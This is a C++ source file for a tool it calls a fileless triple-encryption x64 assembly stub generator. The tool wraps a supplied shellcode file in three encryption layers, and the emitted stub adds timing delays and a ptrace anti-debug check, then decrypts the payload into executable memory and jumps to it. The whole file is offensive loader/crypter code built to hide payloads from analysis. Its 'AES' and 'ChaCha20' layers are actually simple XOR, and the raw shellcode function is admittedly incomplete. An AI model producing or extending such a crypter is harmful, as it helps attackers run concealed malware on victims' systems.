#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>

class FilelessTripleASMStub {
private:
    struct DynamicEntropy {
        uint64_t timeComponent;
        uint64_t memoryComponent;
        uint64_t threadComponent;
        uint64_t counterComponent;
        
        uint64_t mix() {
            auto now = std::chrono::high_resolution_clock::now();
            timeComponent = now.time_since_epoch().count();
            
            void* p = malloc(1);
            memoryComponent = reinterpret_cast<uintptr_t>(p);
            free(p);
            
            threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
            counterComponent++;
            
            uint64_t result = timeComponent;
            result ^= (memoryComponent << 13) | (memoryComponent >> 51);
            result += threadComponent;
            result ^= (counterComponent << 32) | (counterComponent >> 32);
            
            for (int i = 0; i < 3; i++) {
                result ^= result >> 23;
                result *= 0x2127599bf4325c37ULL;
                result ^= result >> 47;
            }
            
            return result;
        }
    };
    
    DynamicEntropy entropy;
    std::mt19937_64 rng;
    
    // Generate random label name
    std::string genLabel() {
        static const char* prefixes[] = {
            "lbl", "loc", "proc", "func", "sub", "call", "jmp", "loop"
        };
        
        std::uniform_int_distribution<> prefixDist(0, 7);
        std::uniform_int_distribution<> numDist(1000, 9999);
        
        return std::string(prefixes[prefixDist(rng)]) + std::to_string(numDist(rng));
    }
    
public:
    FilelessTripleASMStub() {
        entropy.counterComponent = 0;
        rng.seed(entropy.mix());
    }
    
    struct TripleKeys {
        std::vector<uint8_t> xorKey;
        std::vector<uint8_t> chachaKey;
        std::vector<uint8_t> aesKey;
        int encryptionOrder[3]; // 0=AES, 1=ChaCha20, 2=XOR
    };
    
    // Generate random keys
    TripleKeys generateKeys() {
        TripleKeys keys;
        
        rng.seed(entropy.mix());
        std::uniform_int_distribution<> dist(0, 255);
        
        // Fixed size keys for ASM simplicity
        keys.xorKey.resize(32);
        keys.chachaKey.resize(32);
        keys.aesKey.resize(16);
        
        for (size_t i = 0; i < 32; i++) keys.xorKey[i] = dist(rng);
        for (size_t i = 0; i < 32; i++) keys.chachaKey[i] = dist(rng);
        for (size_t i = 0; i < 16; i++) keys.aesKey[i] = dist(rng);
        
        // Randomize order
        keys.encryptionOrder[0] = 0;
        keys.encryptionOrder[1] = 1;
        keys.encryptionOrder[2] = 2;
        
        for (int i = 2; i > 0; i--) {
            std::uniform_int_distribution<> shuffleDist(0, i);
            int j = shuffleDist(rng);
            std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
        }
        
        return keys;
    }
    
    // Apply encryption
    void applyEncryption(std::vector<uint8_t>& data, int method, const TripleKeys& keys) {
        switch (method) {
            case 0: // AES (simplified)
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.aesKey[i % 16];
                }
                break;
            case 1: // ChaCha20 (simplified)
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.chachaKey[i % 32];
                }
                break;
            case 2: // XOR
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.xorKey[i % 32];
                }
                break;
        }
    }
    
    // Generate x64 ASM stub
    std::string generateASMStub(const std::vector<uint8_t>& payload, const TripleKeys& keys) {
        std::stringstream asm_code;
        
        // Encrypt payload
        std::vector<uint8_t> encrypted = payload;
        for (int i = 0; i < 3; ++i) {
            applyEncryption(encrypted, keys.encryptionOrder[i], keys);
        }
        
        // Generate unique labels
        std::string lblMain = genLabel();
        std::string lblData = genLabel();
        std::string lblXorKey = genLabel();
        std::string lblChachaKey = genLabel();
        std::string lblAesKey = genLabel();
        std::string lblDecrypt = genLabel();
        std::string lblExec = genLabel();
        std::string lblDelay = genLabel();
        
        asm_code << "BITS 64\n";
        asm_code << "DEFAULT REL\n\n";
        
        asm_code << "section .text\n";
        asm_code << "global _start\n\n";
        
        asm_code << "_start:\n";
        
        // Random delay using RDTSC
        asm_code << "    ; Random delay\n";
        asm_code << "    rdtsc\n";
        asm_code << "    and eax, 0x3FFFFFFF    ; Limit to reasonable range\n";
        asm_code << "    mov ecx, eax\n";
        asm_code << lblDelay << ":\n";
        asm_code << "    pause\n";
        asm_code << "    loop " << lblDelay << "\n\n";
        
        // Anti-debug check (Linux)
        asm_code << "    ; Anti-debug check\n";
        asm_code << "    mov rax, 101          ; sys_ptrace\n";
        asm_code << "    mov rdi, 0            ; PTRACE_TRACEME\n";
        asm_code << "    xor rsi, rsi\n";
        asm_code << "    xor rdx, rdx\n";
        asm_code << "    xor r10, r10\n";
        asm_code << "    syscall\n";
        asm_code << "    test rax, rax\n";
        asm_code << "    js exit               ; Exit if being debugged\n\n";
        
        // Allocate memory
        asm_code << "    ; Allocate executable memory\n";
        asm_code << "    mov rax, 9            ; sys_mmap\n";
        asm_code << "    xor rdi, rdi          ; addr = NULL\n";
        asm_code << "    mov rsi, " << encrypted.size() << "  ; size\n";
        asm_code << "    mov rdx, 7            ; PROT_READ|PROT_WRITE|PROT_EXEC\n";
        asm_code << "    mov r10, 0x22         ; MAP_PRIVATE|MAP_ANONYMOUS\n";
        asm_code << "    mov r8, -1            ; fd = -1\n";
        asm_code << "    xor r9, r9            ; offset = 0\n";
        asm_code << "    syscall\n";
        asm_code << "    test rax, rax\n";
        asm_code << "    js exit\n";
        asm_code << "    mov r15, rax          ; Save allocated address\n\n";
        
        // Copy encrypted payload to allocated memory
        asm_code << "    ; Copy payload\n";
        asm_code << "    mov rsi, " << lblData << "\n";
        asm_code << "    mov rdi, r15\n";
        asm_code << "    mov rcx, " << encrypted.size() << "\n";
        asm_code << "    rep movsb\n\n";
        
        // Decrypt in reverse order
        asm_code << "    ; Triple decryption\n";
        for (int i = 2; i >= 0; i--) {
            int method = keys.encryptionOrder[i];
            
            // Random micro-delay
            if (i < 2) {
                asm_code << "    ; Micro-delay\n";
                asm_code << "    rdtsc\n";
                asm_code << "    and eax, 0xFFFF\n";
                asm_code << "    mov ecx, eax\n";
                asm_code << "    rep nop\n\n";
            }
            
            switch (method) {
                case 0: // AES
                    asm_code << "    ; Decrypt AES layer\n";
                    asm_code << "    mov rdi, r15\n";
                    asm_code << "    mov rcx, " << encrypted.size() << "\n";
                    asm_code << "    xor rdx, rdx\n";
                    asm_code << "aes_loop" << i << ":\n";
                    asm_code << "    mov rax, rdx\n";
                    asm_code << "    and rax, 15           ; mod 16\n";
                    asm_code << "    mov al, [" << lblAesKey << " + rax]\n";
                    asm_code << "    xor [rdi], al\n";
                    asm_code << "    inc rdi\n";
                    asm_code << "    inc rdx\n";
                    asm_code << "    loop aes_loop" << i << "\n\n";
                    break;
                    
                case 1: // ChaCha20
                    asm_code << "    ; Decrypt ChaCha20 layer\n";
                    asm_code << "    mov rdi, r15\n";
                    asm_code << "    mov rcx, " << encrypted.size() << "\n";
                    asm_code << "    xor rdx, rdx\n";
                    asm_code << "chacha_loop" << i << ":\n";
                    asm_code << "    mov rax, rdx\n";
                    asm_code << "    and rax, 31           ; mod 32\n";
                    asm_code << "    mov al, [" << lblChachaKey << " + rax]\n";
                    asm_code << "    xor [rdi], al\n";
                    asm_code << "    inc rdi\n";
                    asm_code << "    inc rdx\n";
                    asm_code << "    loop chacha_loop" << i << "\n\n";
                    break;
                    
                case 2: // XOR
                    asm_code << "    ; Decrypt XOR layer\n";
                    asm_code << "    mov rdi, r15\n";
                    asm_code << "    mov rcx, " << encrypted.size() << "\n";
                    asm_code << "    xor rdx, rdx\n";
                    asm_code << "xor_loop" << i << ":\n";
                    asm_code << "    mov rax, rdx\n";
                    asm_code << "    and rax, 31           ; mod 32\n";
                    asm_code << "    mov al, [" << lblXorKey << " + rax]\n";
                    asm_code << "    xor [rdi], al\n";
                    asm_code << "    inc rdi\n";
                    asm_code << "    inc rdx\n";
                    asm_code << "    loop xor_loop" << i << "\n\n";
                    break;
            }
        }
        
        // Final delay before execution
        asm_code << "    ; Final delay\n";
        asm_code << "    rdtsc\n";
        asm_code << "    and eax, 0xFFFFFF\n";
        asm_code << "    mov ecx, eax\n";
        asm_code << "final_delay:\n";
        asm_code << "    pause\n";
        asm_code << "    loop final_delay\n\n";
        
        // Execute payload
        asm_code << "    ; Execute payload\n";
        asm_code << "    jmp r15\n\n";
        
        asm_code << "exit:\n";
        asm_code << "    mov rax, 60           ; sys_exit\n";
        asm_code << "    xor rdi, rdi\n";
        asm_code << "    syscall\n\n";
        
        // Data section
        asm_code << "section .data\n\n";
        
        // Encrypted payload
        asm_code << lblData << ":\n";
        for (size_t i = 0; i < encrypted.size(); i++) {
            if (i % 16 == 0) asm_code << "    db ";
            asm_code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)encrypted[i];
            if ((i + 1) % 16 == 0 || i == encrypted.size() - 1) {
                asm_code << "\n";
            } else {
                asm_code << ", ";
            }
        }
        asm_code << "\n";
        
        // Keys
        asm_code << lblXorKey << ":\n    db ";
        for (size_t i = 0; i < keys.xorKey.size(); i++) {
            if (i > 0) asm_code << ", ";
            asm_code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)keys.xorKey[i];
        }
        asm_code << "\n\n";
        
        asm_code << lblChachaKey << ":\n    db ";
        for (size_t i = 0; i < keys.chachaKey.size(); i++) {
            if (i > 0) asm_code << ", ";
            asm_code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)keys.chachaKey[i];
        }
        asm_code << "\n\n";
        
        asm_code << lblAesKey << ":\n    db ";
        for (size_t i = 0; i < keys.aesKey.size(); i++) {
            if (i > 0) asm_code << ", ";
            asm_code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)keys.aesKey[i];
        }
        asm_code << "\n";
        
        return asm_code.str();
    }
    
    // Generate shellcode bytes
    std::vector<uint8_t> generateShellcode(const std::vector<uint8_t>& payload, const TripleKeys& keys) {
        std::vector<uint8_t> shellcode;
        
        // Encrypt payload
        std::vector<uint8_t> encrypted = payload;
        for (int i = 0; i < 3; ++i) {
            applyEncryption(encrypted, keys.encryptionOrder[i], keys);
        }
        
        // x64 shellcode with fileless execution
        // This is a simplified version - full implementation would be much larger
        
        // Random delay using RDTSC
        shellcode.insert(shellcode.end(), {
            0x0F, 0x31,                         // rdtsc
            0x25, 0xFF, 0xFF, 0xFF, 0x3F,       // and eax, 0x3FFFFFFF
            0x89, 0xC1,                         // mov ecx, eax
            0xF3, 0x90,                         // pause
            0xE2, 0xFC                          // loop -4
        });
        
        // mmap syscall to allocate memory
        shellcode.insert(shellcode.end(), {
            0x48, 0x31, 0xFF,                   // xor rdi, rdi
            0x48, 0xC7, 0xC0, 0x09, 0x00, 0x00, 0x00,  // mov rax, 9
            0x48, 0xC7, 0xC6                    // mov rsi, size (to be filled)
        });
        
        // Add size (4 bytes)
        uint32_t size = encrypted.size();
        shellcode.push_back(size & 0xFF);
        shellcode.push_back((size >> 8) & 0xFF);
        shellcode.push_back((size >> 16) & 0xFF);
        shellcode.push_back((size >> 24) & 0xFF);
        
        shellcode.insert(shellcode.end(), {
            0x48, 0xC7, 0xC2, 0x07, 0x00, 0x00, 0x00,  // mov rdx, 7
            0x49, 0xC7, 0xC2, 0x22, 0x00, 0x00, 0x00,  // mov r10, 0x22
            0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF,  // mov r8, -1
            0x4D, 0x31, 0xC9,                   // xor r9, r9
            0x0F, 0x05                          // syscall
        });
        
        // The rest would include:
        // - Copy encrypted payload
        // - Decrypt layers
        // - Jump to decrypted code
        
        return shellcode;
    }
    
    bool generateFromFile(const std::string& inputFile, const std::string& asmFile) {
        std::ifstream in(inputFile, std::ios::binary);
        if (!in) {
            std::cerr << "Failed to open input file: " << inputFile << std::endl;
            return false;
        }
        
        // Read payload
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        in.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> payload(size);
        in.read(reinterpret_cast<char*>(payload.data()), size);
        in.close();
        
        // Generate keys and ASM
        TripleKeys keys = generateKeys();
        std::string asmCode = generateASMStub(payload, keys);
        
        // Write ASM file
        std::ofstream out(asmFile);
        if (!out) {
            std::cerr << "Failed to create ASM file: " << asmFile << std::endl;
            return false;
        }
        
        out << asmCode;
        out.close();
        
        return true;
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "=== Fileless Triple Encryption ASM Stub Generator ===" << std::endl;
        std::cout << "Generates pure x64 assembly stubs with triple-layer encryption\n" << std::endl;
        std::cout << "Features:" << std::endl;
        std::cout << "  - Pure assembly language (no C runtime)" << std::endl;
        std::cout << "  - Triple-layer encryption with randomized order" << std::endl;
        std::cout << "  - Fileless execution (mmap + in-memory decrypt)" << std::endl;
        std::cout << "  - Anti-debugging protection" << std::endl;
        std::cout << "  - Random timing delays (RDTSC-based)" << std::endl;
        std::cout << "  - Minimal size footprint\n" << std::endl;
        std::cout << "Usage: " << argv[0] << " <shellcode_file> <output.asm>" << std::endl;
        std::cout << "\nAssemble with: nasm -f elf64 output.asm -o output.o" << std::endl;
        std::cout << "Link with: ld output.o -o output" << std::endl;
        return 1;
    }
    
    FilelessTripleASMStub generator;
    
    if (generator.generateFromFile(argv[1], argv[2])) {
        std::cout << "Fileless ASM stub generated successfully!" << std::endl;
        std::cout << "Payload size: " << std::ifstream(argv[1], std::ios::binary | std::ios::ate).tellg() << " bytes" << std::endl;
        std::cout << "Output: " << argv[2] << std::endl;
        std::cout << "\nTo create executable:" << std::endl;
        std::cout << "  nasm -f elf64 " << argv[2] << " -o stub.o" << std::endl;
        std::cout << "  ld stub.o -o stub" << std::endl;
    } else {
        std::cerr << "Failed to generate ASM stub!" << std::endl;
        return 1;
    }
    
    return 0;
}